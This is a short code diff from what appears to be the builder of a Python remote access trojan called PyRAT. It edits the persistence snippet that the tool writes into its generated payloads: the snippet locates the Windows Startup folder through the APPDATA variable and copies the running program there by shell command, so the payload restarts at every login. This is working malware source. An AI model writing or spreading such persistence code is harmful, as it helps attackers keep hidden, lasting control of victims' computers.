@@ -1071,7 +1071,7 @@ class PyRAT:
             if self.startup.get():
                 self.startup.toggle()
                 startup = r"""
-startup_folder = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+startup_folder = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 subprocess.run(f"copy \"{sys.argv[0]}\" \"{startup_folder}\"", shell=True)
 """
 
